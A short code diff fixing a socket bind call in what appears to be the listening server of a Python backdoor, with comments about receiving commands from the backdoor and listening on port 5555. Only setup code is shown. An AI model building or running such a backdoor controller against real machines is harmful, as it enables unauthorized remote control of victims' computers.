@@ -25,7 +25,7 @@ def reliable_recv(): #Recieves commands from backfoor
             continue
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #socket.socket(IPv4,Tcp)
-sock.bind(('192.168.1.19, 5555')) #Host IP and Port to use
+sock.bind(('192.168.1.19', 5555)) #Host IP and Port to use
 
 print('[+] Listening for incoming connections...')
 sock.listen(5) #Max number of connections listening for
